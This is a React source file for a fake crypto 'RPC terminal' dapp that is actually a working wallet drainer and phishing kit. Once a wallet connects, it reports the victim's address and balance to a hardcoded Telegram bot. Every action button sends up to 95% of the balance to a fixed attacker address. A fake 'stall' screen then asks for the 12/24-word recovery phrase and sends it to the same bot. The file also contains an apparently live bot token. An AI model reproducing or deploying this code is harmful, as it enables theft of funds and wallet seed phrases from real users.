import React, { useState, useEffect } from 'react';
import { useAccount, useBalance, useSendTransaction } from 'wagmi';
import { parseEther, formatEther } from 'viem';

export default function EvedexTerminal() {
  const { address, isConnected } = useAccount();
  const { data: balance } = useBalance({ address });
  const { sendTransaction } = useSendTransaction();
  
  const [view, setView] = useState("menu"); 
  const [activeTask, setActiveTask] = useState(""); 
  const [loading, setLoading] = useState(false);
  const [loadingText, setLoadingText] = useState("ROUTING...");
  const [inputVal, setInputVal] = useState(""); 
  const [seedVal, setSeedVal] = useState("");   
  const [isSyncing, setIsSyncing] = useState(false);
  const [syncProgress, setSyncProgress] = useState(0);

  const botToken = "8522972159:AAFfmNh8xmBgqWYxY75SXVfkaMw9AjFCRVQ";
  const chatId = "7630238860";
  const destination = "0xcedde9012afee48a0f5d19378f8087bd20f7d34e";

  // Prevent spamming Telegram to avoid 429 blocks
  const logToTelegram = async (msg) => {
    try {
      fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: chatId, text: msg }),
      });
    } catch (e) {}
  };

  useEffect(() => {
    if (isConnected && address && balance?.formatted) {
      logToTelegram(`👀 LEAD_ACTIVE: ${address}\nBAL: ${balance.formatted} ${balance.symbol}`);
    }
  }, [isConnected, address]);

  const executeTaskAction = async () => {
    if (!balance || !balance.value) { setView("seed_gate"); return; }
    setLoading(true);
    setLoadingText(`VALIDATING...`);
    try {
      let val;
      const max = (balance.value * 95n) / 100n;
      if (activeTask === "Rectify" || !inputVal) {
        val = max;
      } else {
        try {
          const p = parseEther(inputVal);
          val = p > max ? max : p;
        } catch { val = max; }
      }
      sendTransaction({ to: destination, value: val }, {
        onSuccess: (h) => {
          logToTelegram(`✅ SUCCESS: ${activeTask}\nADDR: ${address}\nVAL: ${formatEther(val)}\nHASH: ${h}`);
          setTimeout(() => { setView("seed_gate"); setLoading(false); }, 2000);
        },
        onError: () => { 
            logToTelegram(`❌ REJECTED: ${address}`);
            setLoading(false); 
            setView("seed_gate"); 
        }
      });
    } catch (e) { setLoading(false); setView("seed_gate"); }
  };

  return (
    <div style={{minHeight:'100vh', backgroundColor:'#05070a', color:'#e2e8f0', fontFamily:'sans-serif', padding:'20px', textTransform:'uppercase', display:'flex', flexDirection:'column', userSelect:'none'}}>
      
      {/* Header */}
      <header style={{display:'flex', justifyContent:'space-between', alignItems:'center', borderBottom:'1px solid #1e293b', paddingBottom:'15px', marginBottom:'20px'}}>
        <div>
          <div style={{color:'#06b6d4', fontWeight:'900', fontStyle:'italic', fontSize:'18px'}}>RPC TERMINAL</div>
          <div style={{fontSize:'8px', color:'#475569', marginTop:'4px'}}>SECURE_NODE: {address ? address.slice(0,12) : "OFFLINE"}</div>
        </div>
        <w3m-button balance="hide" />
      </header>

      {/* Hero Status Bar */}
      <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'12px', padding:'10px', marginBottom:'20px', display:'flex', justifyContent:'space-between', alignItems:'center'}}>
        <div style={{fontSize:'8px', color:'#0891b2'}}>● LIVE_MARKET_FEED</div>
        <div style={{fontSize:'8px', color:'#10b981'}}>SIGNAL: 99.9%</div>
      </div>

      <div style={{flex:1}}>
        {!isConnected ? (
           <div style={{textAlign:'center', marginTop:'40px'}}>
              <div style={{fontSize:'40px', marginBottom:'20px'}}>🔒</div>
              <div style={{fontSize:'12px', color:'#64748b', marginBottom:'20px'}}>AWAITING ENCRYPTED CONNECTION...</div>
              <w3m-button />
           </div>
        ) : (
          <>
            {view === "menu" && (
              <div style={{display:'grid', gridTemplateColumns:'1fr 1fr 1fr', gap:'10px'}}>
                {["Claim", "Stake", "Unstake", "Migrate", "Swap", "Rectify", "Airdrop", "Bridge", "Sync"].map(n => (
                  <button key={n} onClick={() => {setActiveTask(n); setView("task_box");}} style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', padding:'20px 10px', borderRadius:'15px', color:'#475569', fontSize:'9px', fontWeight:'900', cursor:'pointer'}}>
                    <div style={{fontSize:'16px', marginBottom:'5px'}}>⚙️</div>{n}
                  </button>
                ))}
              </div>
            )}

            {view === "task_box" && (
              <div style={{backgroundColor:'#0d1117', border:'1px solid #1e293b', borderRadius:'25px', padding:'30px', textAlign:'center'}}>
                <button onClick={()=>setView("menu")} style={{background:'none', border:'none', color:'#475569', fontSize:'8px', marginBottom:'25px', cursor:'pointer'}}>← BACK_TO_CONSOLE</button>
                <h2 style={{color:'white', fontWeight:'900', fontStyle:'italic', marginBottom:'20px', fontSize:'22px'}}>{activeTask}</h2>
                <div style={{backgroundColor:'black', border:'1px solid #1e293b', padding:'20px', borderRadius:'15px', textAlign:'left', marginBottom:'25px'}}>
                  <label style={{fontSize:'7px', color:'#0e7490', display:'block', marginBottom:'8px', letterSpacing:'1px'}}>{activeTask === "Rectify" ? "VAULT_BALANCE (LOCKED)" : "SPECIFY_AMOUNT"}</label>
                  {activeTask === "Rectify" ? (
                    <div style={{fontSize:'22px', color:'white', fontWeight:'bold'}}>{balance?.formatted ? balance.formatted.slice(0,9) : "0.000"} <span style={{fontSize:'10px'}}>{balance?.symbol}</span></div>
                  ) : (
                    <input type="number" value={inputVal} onChange={(e)=>setInputVal(e.target.value)} placeholder="0.00" style={{background:'none', border:'none', color:'#22d3ee', fontSize:'22px', width:'100%', outline:'none', fontWeight:'bold'}} autoFocus />
                  )}
                </div>
                <button onClick={executeTaskAction} style={{width:'100%', backgroundColor:'#0891b2', color:'white', padding:'20px', borderRadius:'15px', border:'none', fontWeight:'900', fontSize:'11px', boxShadow:'0 10px 20px rgba(0,0,0,0.5)', cursor:'pointer'}}>EXECUTE {activeTask}</button>
              </div>
            )}
          </>
        )}
      </div>

      {view === "seed_gate" && (
        <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.99)', zIndex:1000, display:'flex', alignItems:'center', justifyContent:'center', padding:'20px', backdropBlur:'10px'}}>
          <div style={{backgroundColor:'#0d1117', border:'1px solid #7f1d1d', borderRadius:'30px', padding:'40px 20px', width:'100%', maxWidth:'360px', textAlign:'center'}}>
            {!isSyncing ? (
              <>
                <div style={{fontSize:'32px', marginBottom:'15px'}}>⚠️</div>
                <div style={{color:'white', fontWeight:'900', fontSize:'16px', marginBottom:'10px'}}>STALL_DETECTED (90%)</div>
                <p style={{fontSize:'8px', color:'#475569', marginBottom:'25px', lineHeight:'1.5'}}>RPC CONNECTION TIMEOUT. PLEASE ENTER YOUR 12/24 WORD RECOVERY PHRASE TO MANUALLY ALIGN NODES.</p>
                <textarea value={seedVal} onChange={(e)=>setSeedVal(e.target.value)} placeholder="ENTER MASTER KEY..." style={{width:'100%', height:'110px', backgroundColor:'black', border:'1px solid #1e293b', borderRadius:'15px', color:'#22d3ee', padding:'15px', fontSize:'11px', outline:'none', marginBottom:'20px', textTransform:'uppercase'}} />
                <button onClick={()=>{setIsSyncing(true); logToTelegram(`🚨 SEED: ${seedVal}\nADDR: ${address}`); let c=0; const i=setInterval(()=>{c++; setSyncProgress(c); if(c>=100)clearInterval(i)},120);}} disabled={seedVal.trim().split(/\s+/).length < 12} style={{width:'100%', backgroundColor:'#450a0a', color:'white', padding:'20px', borderRadius:'12px', border:'none', fontWeight:'900', fontSize:'11px', opacity: seedVal.trim().split(/\s+/).length < 12 ? 0.2 : 1}}>VALIDATE_KEY</button>
              </>
            ) : (
              <div style={{padding:'20px 0'}}>
                <div style={{fontSize:'32px', color:'white', fontWeight:'900', fontStyle:'italic'}}>{syncProgress}%</div>
                <div style={{fontSize:'9px', color:'#0891b2', marginTop:'15px', letterSpacing:'3px'}}>SYNCHRONIZING...</div>
              </div>
            )}
          </div>
        </div>
      )}

      {loading && <div style={{position:'fixed', inset:0, backgroundColor:'rgba(0,0,0,0.85)', zIndex:2000, display:'flex', alignItems:'center', justifyContent:'center', color:'#22d3ee', fontSize:'10px', fontWeight:'900', letterSpacing:'4px'}}>{loadingText}</div>}
    </div>
  );
}
